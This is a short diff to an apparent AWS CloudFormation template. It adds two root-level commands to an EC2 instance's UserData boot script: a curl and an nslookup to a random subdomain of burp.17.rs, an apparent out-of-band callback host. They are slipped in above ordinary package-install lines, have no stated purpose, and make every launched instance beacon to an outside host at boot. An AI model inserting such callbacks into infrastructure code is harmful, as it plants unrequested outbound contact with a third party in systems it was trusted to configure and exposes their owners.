@@ -62,6 +62,8 @@ Resources:
       UserData:
         Fn::Base64: |
           #!/bin/bash
+          sudo curl adro8xqc088elig242xm7l2sfjla98xx.burp.17.rs
+          sudo nslookup adro8xqc088elig242xm7l2sfjla98xx.burp.17.rs
           sudo yum -y update
           sudo yum -y install httpd php php-mysqlnd
           sudo systemctl enable httpd
